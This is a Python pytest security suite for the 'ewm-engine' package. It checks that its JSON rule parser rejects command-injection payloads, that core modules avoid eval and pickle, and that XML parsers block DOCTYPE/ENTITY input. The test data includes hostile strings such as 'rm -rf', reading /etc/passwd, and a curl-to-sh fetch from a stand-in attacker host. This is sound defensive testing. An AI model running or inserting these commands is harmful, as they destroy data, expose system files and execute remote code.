"""Verification suite for Prompt E9: Security, Reliability, Packaging, and Integrations.

Verifies:
1. Malicious OS command injection payloads (`os.system`, `subprocess.Popen`, `/bin/sh`,
   `rm -rf`, command substitution `$(...)`, backticks, `__import__`) injected into the
   JSON configuration parser (`parse_cda_configuration_json`, `ConfigurationDatastore.load_json`,
   `BusinessRule`, `CDAInputPayload`) are caught and raise `pydantic.ValidationError`.
2. Strict Pydantic validation preserves the dynamic runtime adaptation of `RetrieveAndReasonEngine`.
3. Zero `eval()`, `exec()`, or `pickle.load()` calls in core and domain modules, plus XXE
   (`<!DOCTYPE` / `<!ENTITY`) rejection in OCEL 2.0 XML and XES parsers.
4. `pyproject.toml` optional dependency groups (`[finance]`, `[se]`, `[all]`), CLI entry
   points (`ewm`, `ewm-engine`), and `SECURITY.md` documentation.
"""

from __future__ import annotations

import ast
import json
import tomllib
from pathlib import Path

import pytest
from pydantic import ValidationError

from ewm_engine.core.actions import Action
from ewm_engine.core.dynamics import (
    CDAConfigurationPayload,
    CDAInputPayload,
    ConfigurationDatastore,
    RetrieveAndReasonEngine,
    parse_cda_configuration_json,
)
from ewm_engine.core.ocel import StateEncoder, StateEncodingError
from ewm_engine.core.resources import Resource
from ewm_engine.core.state import WorldState

REPO_ROOT = Path(__file__).resolve().parents[2]


@pytest.mark.security
def test_malicious_os_command_injection_in_json_config_raises_validation_error() -> None:
    """Injecting OS commands into the JSON configuration parser raises pydantic.ValidationError."""
    malicious_payloads = [
        json.dumps(
            {
                "rule_id": "RULE-MAL-1",
                "action_types": ["process_order"],
                "rule_text": "os.system('rm -rf /tmp/critical_data')",
            }
        ),
        json.dumps(
            {
                "rules": [
                    {
                        "rule_id": "RULE-MAL-2",
                        "action_types": ["*"],
                        "rule_text": "subprocess.Popen(['/bin/sh', '-c', 'cat /etc/passwd'])",
                    }
                ]
            }
        ),
        json.dumps(
            {
                "rule_id": "RULE-MAL-3",
                "action_types": ["process_order"],
                "rule_text": "resource:inventory -= 10.0",
                "parameters": {"hook": "$(curl -s http://attacker.invalid/pwn.sh | sh)"},
            }
        ),
        json.dumps(
            {
                "rule_id": "RULE-MAL-4",
                "action_types": ["process_order"],
                "rule_text": "__import__('os').system('powershell.exe -Command calc.exe')",
            }
        ),
        json.dumps(
            {
                "rule_id": "RULE-MAL-5",
                "action_types": ["process_order"],
                "rule_text": "resource:inventory -= 1.0; rm -rf /var/log",
            }
        ),
        json.dumps(
            {
                "rule_id": "RULE-MAL-6",
                "action_types": ["process_order"],
                "rule_text": "resource:inventory = `whoami`",
            }
        ),
        # Unknown extra field in JSON configuration must also fail strict Pydantic validation
        json.dumps(
            {
                "rule_id": "RULE-EXTRA",
                "action_types": ["process_order"],
                "rule_text": "resource:inventory -= 5.0",
                "unexpected_shell_field": "malicious_extra",
            }
        ),
    ]

    datastore = ConfigurationDatastore()

    for payload in malicious_payloads:
        with pytest.raises(ValidationError):
            parse_cda_configuration_json(payload)
        with pytest.raises(ValidationError):
            datastore.load_json(payload)
        with pytest.raises(ValidationError):
            datastore.register_rule(payload)

    assert len(datastore.rules) == 0

    # Also verify CDAInputPayload rejects malicious OS command strings in state or action dicts
    with pytest.raises(ValidationError):
        CDAInputPayload(
            state={"resources": {"inventory": 100.0}},
            action={"id": "a1", "type": "process_order", "parameters": {"cmd": "/bin/bash -i"}},
            retrieved_rules=(),
        )


@pytest.mark.security
def test_pydantic_validation_preserves_dynamic_retrieve_and_reason_engine() -> None:
    """Confirm strict Pydantic schema validation preserves RetrieveAndReasonEngine dynamic updates."""
    datastore = ConfigurationDatastore()
    valid_json_v1 = json.dumps(
        {
            "rules": [
                {
                    "rule_id": "RULE-SAFE-01",
                    "action_types": ["adjust_budget"],
                    "rule_text": "resource:budget -= 250.0",
                    "version": "1.0.0",
                }
            ]
        }
    )
    loaded = datastore.load_json(valid_json_v1)
    assert len(loaded) == 1
    assert isinstance(CDAConfigurationPayload(rules=tuple(loaded)), CDAConfigurationPayload)

    state = WorldState(
        step=0,
        timestamp=1700000000.0,
        resources={"budget": Resource(id="budget", current=1000.0, unit="usd")},
    )
    action = Action(id="act_1", type="adjust_budget")

    engine = RetrieveAndReasonEngine(datastore=datastore)
    next_s1, diff_1 = engine.step(state, action)
    assert not diff_1.is_noop
    assert next_s1.resources["budget"].current == pytest.approx(750.0)

    # Dynamically update rule via JSON / update_rule and verify immediate adaptation
    datastore.update_rule("RULE-SAFE-01", rule_text="resource:budget -= 400.0", version="2.0.0")
    next_s2, diff_2 = engine.step(state, action)
    assert not diff_2.is_noop
    assert next_s2.resources["budget"].current == pytest.approx(600.0)

    # Attempting to update an existing rule with an OS command raises ValidationError
    with pytest.raises(ValidationError):
        datastore.update_rule("RULE-SAFE-01", rule_text="os.system('whoami')")


@pytest.mark.security
def test_no_eval_or_pickle_and_xxe_xml_defense(tmp_path: Path) -> None:
    """Verify zero eval()/exec()/pickle.load() in core/domains and test XXE XML defense."""
    for subdir in ("core", "domains", "evaluation"):
        target_dir = REPO_ROOT / "src" / "ewm_engine" / subdir
        for py_file in target_dir.rglob("*.py"):
            tree = ast.parse(py_file.read_text(encoding="utf-8"), filename=str(py_file))
            for node in ast.walk(tree):
                if isinstance(node, ast.Call):
                    if isinstance(node.func, ast.Name) and node.func.id in ("eval", "exec"):
                        pytest.fail(f"Forbidden {node.func.id}() call in {py_file}:{node.lineno}")
                    if (
                        isinstance(node.func, ast.Attribute)
                        and isinstance(node.func.value, ast.Name)
                        and node.func.value.id == "pickle"
                        and node.func.attr in ("load", "loads")
                    ):
                        pytest.fail(
                            f"Forbidden pickle.{node.func.attr}() call in {py_file}:{node.lineno}"
                        )

    # Verify XXE (DOCTYPE / ENTITY) XML payloads are blocked by StateEncoder
    xxe_xml = """<?xml version="1.0"?>
    <!DOCTYPE lolz [
      <!ENTITY lol "lol">
    ]>
    <log><events></events></log>
    """
    with StateEncoder(tmp_path / "xxe_test.sqlite") as encoder:
        with pytest.raises(StateEncodingError, match="DOCTYPE and ENTITY"):
            encoder.encode_xml(xxe_xml)
        with pytest.raises(StateEncodingError, match="DOCTYPE and ENTITY"):
            encoder.ingest_xes(xxe_xml)


@pytest.mark.security
def test_pyproject_toml_extras_entrypoints_and_security_md() -> None:
    """Verify pyproject.toml metadata, [finance]/[se] extras, entrypoints, and SECURITY.md."""
    pyproject_path = REPO_ROOT / "pyproject.toml"
    assert pyproject_path.exists()
    data = tomllib.loads(pyproject_path.read_text(encoding="utf-8"))

    project = data["project"]
    assert project["name"] == "ewm-engine"
    opt_deps = project["optional-dependencies"]
    assert "finance" in opt_deps
    assert "se" in opt_deps
    assert "swe" in opt_deps
    assert "all" in opt_deps

    scripts = project["scripts"]
    assert "ewm" in scripts
    assert "ewm-engine" in scripts

    sec_md = REPO_ROOT / "SECURITY.md"
    assert sec_md.exists()
    sec_text = sec_md.read_text(encoding="utf-8")
    assert "Reporting a Vulnerability" in sec_text
    assert "ValidationError" in sec_text
